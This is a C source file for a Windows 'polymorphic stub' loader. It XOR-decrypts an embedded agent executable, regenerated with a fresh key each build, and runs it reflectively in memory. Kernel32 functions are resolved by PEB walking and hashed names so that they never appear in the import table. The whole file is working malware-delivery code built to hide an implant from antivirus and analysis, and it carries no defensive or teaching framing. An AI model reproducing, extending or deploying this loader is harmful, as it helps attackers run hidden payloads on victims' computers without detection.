/*
 * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
 *
 * This file is compiled as a standalone .exe. The encrypted agent bytes and
 * XOR key are #included from a generated header (stub_payload.h) that the
 * build script creates fresh for every build.
 *
 * IAT is minimal (only CRT startup basics from kernel32). All sensitive APIs
 * are resolved at runtime via PEB walk — VirtualAlloc, VirtualProtect,
 * LoadLibraryA, GetProcAddress never appear in the import table.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -s -I. stub_loader.c -o agent.exe \
 *       -lkernel32 -static-libgcc -Wl,--subsystem,windows -Wl,--gc-sections
 */

#include <windows.h>
#include <winnt.h>

/* ─── Generated per-build: encrypted payload + key ─── */
#include "stub_payload.h"

/* ─── PEB walk API resolver (self-contained, no IAT) ─── */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef void    (WINAPI *fnRtlZeroMemory_t)(PVOID, SIZE_T);
typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);

/* x64 exception handling — CRITICAL for reflective PE loading */
#if defined(_M_X64) || defined(__x86_64__)
typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

typedef struct {
    fnLoadLibraryA_t         pLoadLibraryA;
    fnGetProcAddress_t       pGetProcAddress;
    fnVirtualAlloc_t         pVirtualAlloc;
    fnVirtualProtect_t       pVirtualProtect;
    fnVirtualFree_t          pVirtualFree;
    fnFlushInstructionCache_t pFlushInstructionCache;
    fnGetCurrentProcess_t    pGetCurrentProcess;
#if defined(_M_X64) || defined(__x86_64__)
    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
#endif
} RESOLVED_APIS;

/* DJB2 hash — case-insensitive for module names (wide char) */
static DWORD _hash_mod(const wchar_t *s) {
    DWORD h = 5381;
    while (*s) {
        wchar_t c = *s++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)c;
    }
    return h;
}

/* DJB2 hash — case-sensitive for function names (narrow char) */
static DWORD _hash_func(const char *s) {
    DWORD h = 5381;
    while (*s)
        h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

/* Resolve a single function from a loaded module's export table */
static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)modBase;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(modBase + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(modBase + expDir->VirtualAddress);
    DWORD *names    = (DWORD *)(modBase + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(modBase + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(modBase + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(modBase + names[i]);
        if (_hash_func(fname) == funcHash)
            return (void *)(modBase + funcs[ordinals[i]]);
    }
    return NULL;
}

/* Walk PEB to find a loaded module by hash */
static BYTE *_find_module(DWORD modHash) {
    /* PEB from TEB (gs:[0x60] on x64) */
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
#endif

    /* PEB->Ldr (offset 0x18 on x64) */
    void *ldr = *(void **)((BYTE *)peb + 0x18);

    /* Ldr->InMemoryOrderModuleList (offset 0x20 on x64) */
    LIST_ENTRY *head = (LIST_ENTRY *)((BYTE *)ldr + 0x20);
    LIST_ENTRY *curr = head->Flink;

    while (curr != head) {
        /*
         * curr points to InMemoryOrderLinks which is at offset 0x10 in
         * LDR_DATA_TABLE_ENTRY.  All offsets below are relative to curr.
         *
         * Struct field              Struct offset   From curr (- 0x10)
         * ──────────────────────    ─────────────   ──────────────────
         * InMemoryOrderLinks        0x10            0x00 (curr itself)
         * DllBase                   0x30            0x20
         * BaseDllName (UNICODE_STR) 0x58            0x48
         * BaseDllName.Buffer        0x58 + 0x08     0x50
         */
        wchar_t *baseName = *(wchar_t **)((BYTE *)curr + 0x50);
        void *dllBase = *(void **)((BYTE *)curr + 0x20);

        if (baseName && dllBase) {
            if (_hash_mod(baseName) == modHash)
                return (BYTE *)dllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

/* Hash constants for kernel32.dll functions */
#define H_KERNEL32              0x7040EE75
#define H_LoadLibraryA          0x5FBFF0FB
#define H_GetProcAddress        0xCF31BB1F
#define H_VirtualAlloc          0x382C0F97
#define H_VirtualProtect        0x844FF18D
#define H_VirtualFree           0x668FCF2E
#define H_FlushInstructionCache 0xB7DCEDDD
#define H_GetCurrentProcess     0xCA8D7527
#define H_NTDLL                 0x22D3B5ED
#define H_RtlAddFunctionTable   0xBDB9F1AE
#define H_CreateFileA           0xEB96C5FA
#define H_WriteFile             0x663CECB0
#define H_GetTempPathA          0x9EF979E9
#define H_CloseHandle           0x3870CA07

/* ─── Debug tracing (writes to %TEMP%\stub_debug.log) ─── */
#ifdef STUB_DEBUG

typedef HANDLE (WINAPI *fnCreateFileA_t)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
typedef BOOL   (WINAPI *fnWriteFile_t)(HANDLE,LPCVOID,DWORD,LPDWORD,LPVOID);
typedef DWORD  (WINAPI *fnGetTempPathA_t)(DWORD,LPSTR);
typedef BOOL   (WINAPI *fnCloseHandle_t)(HANDLE);

static fnCreateFileA_t  _dbg_CreateFileA;
static fnWriteFile_t    _dbg_WriteFile;
static fnGetTempPathA_t _dbg_GetTempPathA;
static fnCloseHandle_t  _dbg_CloseHandle;
static char             _dbg_path[260];

static void _dbg_init(BYTE *k32) {
    _dbg_CreateFileA  = (fnCreateFileA_t) _resolve_export(k32, H_CreateFileA);
    _dbg_WriteFile    = (fnWriteFile_t)   _resolve_export(k32, H_WriteFile);
    _dbg_GetTempPathA = (fnGetTempPathA_t)_resolve_export(k32, H_GetTempPathA);
    _dbg_CloseHandle  = (fnCloseHandle_t) _resolve_export(k32, H_CloseHandle);
    if (_dbg_GetTempPathA) {
        DWORD n = _dbg_GetTempPathA(240, _dbg_path);
        /* append filename manually — no lstrcpy dependency */
        const char *tail = "stub_debug.log";
        for (int i = 0; tail[i]; i++) _dbg_path[n + i] = tail[i];
        _dbg_path[n + 14] = '\0';
    }
}

static void _dbg_log(const char *msg) {
    if (!_dbg_CreateFileA || !_dbg_WriteFile) return;
    HANDLE h = _dbg_CreateFileA(_dbg_path, 4/*FILE_APPEND_DATA*/, 3/*SHARE_RW*/, 0,
                                 4/*OPEN_ALWAYS*/, 0x80/*NORMAL*/, 0);
    if (h != (HANDLE)-1) {
        DWORD n = 0;
        const char *p = msg;
        while (*p) { n++; p++; }
        DWORD w;
        _dbg_WriteFile(h, msg, n, &w, 0);
        _dbg_WriteFile(h, "\r\n", 2, &w, 0);
        _dbg_CloseHandle(h);
    }
}

#define SLOG(msg) _dbg_log(msg)
#else
#define SLOG(msg) ((void)0)
#endif /* STUB_DEBUG */

static BOOL _resolve_apis(RESOLVED_APIS *api) {
    BYTE *k32 = _find_module(H_KERNEL32);
    if (!k32) return FALSE;

#ifdef STUB_DEBUG
    _dbg_init(k32);
    SLOG("[stub] kernel32 found, resolving APIs...");
#endif

    api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
    api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
    api->pVirtualAlloc       = (fnVirtualAlloc_t)       _resolve_export(k32, H_VirtualAlloc);
    api->pVirtualProtect     = (fnVirtualProtect_t)     _resolve_export(k32, H_VirtualProtect);
    api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
    api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);

    SLOG("[stub] core APIs resolved");

#if defined(_M_X64) || defined(__x86_64__)
    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
    if (!api->pRtlAddFunctionTable) {
        BYTE *ntdll = _find_module(H_NTDLL);
        if (ntdll)
            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
    }
    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable resolved" : "[stub] RtlAddFunctionTable MISSING!");
#endif

    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
               api->pVirtualAlloc && api->pVirtualProtect);
    SLOG(ok ? "[stub] API resolve OK" : "[stub] API resolve FAILED");
    return ok;
}


/* ─── Reflective PE Loader ─── */

/*
 * Loads a PE from a raw byte buffer into memory and calls its entry point.
 * Handles:
 *   - Section mapping
 *   - Base relocation processing
 *   - Import table resolution
 *   - Section protection
 *   - TLS callbacks (basic)
 *   - Entry point invocation
 */

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
typedef int  (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);

/* Process base relocations when PE loaded at non-preferred address */
static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
    IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress || !relocDir->Size)
        return TRUE;  /* No relocations needed */

    IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
    IMAGE_BASE_RELOCATION *end   = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + relocDir->Size);

    while (reloc < end && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            BYTE *patch = base + reloc->VirtualAddress + offset;

            switch (type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONGLONG *)patch += delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)patch += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)patch += (WORD)(delta >> 16);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)patch += (WORD)delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;  /* Padding, skip */
                default:
                    return FALSE;  /* Unknown reloc type */
            }
        }

        reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

/* Resolve import table */
static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir->VirtualAddress || !impDir->Size)
        return TRUE;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);

    while (imp->Name) {
        const char *dllName = (const char *)(base + imp->Name);
        HMODULE hMod = api->pLoadLibraryA(dllName);
        if (!hMod)
            return FALSE;

        IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        IMAGE_THUNK_DATA *iatThunk  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = api->pGetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn = (IMAGE_IMPORT_BY_NAME *)(base +
                    origThunk->u1.AddressOfData);
                func = api->pGetProcAddress(hMod, ibn->Name);
            }
            if (!func)
                return FALSE;

            iatThunk->u1.Function = (ULONGLONG)func;
            origThunk++;
            iatThunk++;
        }
        imp++;
    }
    return TRUE;
}

/* Set per-section memory protections */
static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = sec->Characteristics;
        BOOL exec  = !!(chars & IMAGE_SCN_MEM_EXECUTE);
        BOOL read  = !!(chars & IMAGE_SCN_MEM_READ);
        BOOL write = !!(chars & IMAGE_SCN_MEM_WRITE);

        if (exec && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)   protect = PAGE_EXECUTE_READ;
        else if (exec)           protect = PAGE_EXECUTE;
        else if (read && write)  protect = PAGE_READWRITE;
        else if (read)           protect = PAGE_READONLY;
        else if (write)          protect = PAGE_READWRITE;

        DWORD old;
        SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        if (secSize > 0)
            api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
    }
}

/* Process TLS callbacks */
static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
    IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsDir->VirtualAddress || !tlsDir->Size)
        return;

    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + tlsDir->VirtualAddress);
    if (!tls->AddressOfCallBacks)
        return;

    PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
    while (*callbacks) {
        (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
        callbacks++;
    }
}

/* Main PE loader function */
static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
    SLOG("[stub] load_pe_and_run enter");

    /* Validate PE */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ signature"); return FALSE; }

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE signature"); return FALSE; }

    SLOG("[stub] PE validated OK");

    /* Allocate memory at preferred base, fall back to any address */
    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)api->pVirtualAlloc(
        (LPVOID)nt->OptionalHeader.ImageBase,
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    LONGLONG delta = 0;
    if (!base) {
        base = (BYTE *)api->pVirtualAlloc(
            NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
        SLOG("[stub] allocated at fallback address");
    } else {
        SLOG("[stub] allocated at preferred base");
    }
    delta = (LONGLONG)(base - nt->OptionalHeader.ImageBase);

    /* Copy PE headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = rawPE[i];

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE *dst = base + sec->VirtualAddress;
        BYTE *src = rawPE + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++)
            dst[j] = src[j];
    }
    SLOG("[stub] sections mapped");

    /* Fix up NT headers pointer to mapped copy */
    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Process relocations */
    if (delta != 0) {
        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocations"); return FALSE; }
        SLOG("[stub] relocations applied");
    } else {
        SLOG("[stub] no relocations needed (preferred base)");
    }

    /* Resolve imports */
    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
    SLOG("[stub] imports resolved");

    /* Flush instruction cache */
    if (api->pFlushInstructionCache && api->pGetCurrentProcess)
        api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);

    /* Register exception handlers (x64 ONLY — CRITICAL) */
#if defined(_M_X64) || defined(__x86_64__)
    {
        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
            PRUNTIME_FUNCTION pFuncTable = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
            api->pRtlAddFunctionTable(pFuncTable, numEntries, (DWORD64)base);
            SLOG("[stub] exception handlers registered");
        } else {
            SLOG("[stub] WARNING: no exception dir or RtlAddFunctionTable missing");
        }
    }
#endif

    /* Set section protections */
    _protect_sections(base, mappedNt, api);
    SLOG("[stub] section protections set");

    /* Process TLS */
    _process_tls(base, mappedNt);
    SLOG("[stub] TLS processed");

    /* Update the PEB ImageBaseAddress so the loaded PE sees itself correctly */
    {
        void *peb;
#if defined(_M_X64) || defined(__x86_64__)
        __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
#else
        __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
#endif
        *(void **)((BYTE *)peb + 0x10) = base;
    }
    SLOG("[stub] PEB updated");

    /* Call entry point */
    DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
    if (!entryRVA) { SLOG("[stub] FAIL: no entry point"); return FALSE; }

    void *entry = base + entryRVA;
    SLOG("[stub] calling entry point...");

    /* Determine if it's a DLL (DllMain) or EXE (WinMain/main) */
    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        DllMain_t dllMain = (DllMain_t)entry;
        dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef void (*EntryPoint_t)(void);
        EntryPoint_t ep = (EntryPoint_t)entry;
        ep();
    }

    SLOG("[stub] entry point returned");
    return TRUE;
}


/* ─── Stub Entry Point ─── */

/*
 * The build script generates stub_payload.h with:
 *   static unsigned char g_enc_payload[] = { ... };  // XOR-encrypted PE bytes
 *   static unsigned char g_xor_key[] = { ... };      // Random key (32 bytes)
 *   #define PAYLOAD_SIZE <n>
 *   #define KEY_SIZE <n>
 */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* Phase 1: Resolve APIs from PEB (no IAT entries) */
    RESOLVED_APIS api;
    if (!_resolve_apis(&api))
        return 1;

    SLOG("[stub] Phase 2: decrypting payload...");

    /* Phase 2: Decrypt payload in-place */
    for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
        g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];

    /* Quick sanity check: first 2 bytes should be 'MZ' after decrypt */
    if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
        SLOG("[stub] FAIL: decryption produced bad MZ header");
        return 1;
    }
    SLOG("[stub] decryption OK, MZ validated");

    /* Phase 3: Reflectively load the decrypted PE and execute */
    if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api))
        return 1;

    /* Agent runs in load_pe_and_run — we only get here if it exits cleanly */
    return 0;
}
